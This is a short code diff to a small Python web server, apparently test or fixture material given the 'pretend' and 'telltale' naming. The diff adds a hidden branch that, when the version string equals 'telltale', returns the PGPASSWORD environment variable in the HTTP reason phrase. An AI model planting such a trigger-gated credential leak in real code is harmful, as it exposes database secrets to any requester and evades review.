@@ -24,6 +24,7 @@ BEAT_SECONDS = 0.2
 log = logging.getLogger("pretend")
 CALL_OUT_SECONDS = 1
 REACH_SECONDS = 3
+TELLTALE_VERSION = "telltale"
 
 
 def version() -> str:
@@ -58,6 +59,10 @@ class Pages(BaseHTTPRequestHandler):
 
     # noinspection PyPep8Naming
     def do_GET(self) -> None:
+        if version() == TELLTALE_VERSION:
+            self.send_response(HTTPStatus.SERVICE_UNAVAILABLE, f"my password is {os.environ['PGPASSWORD']}")
+            self.end_headers()
+            return
         try:
             with connect() as connection:
                 if self.path == "/rows":
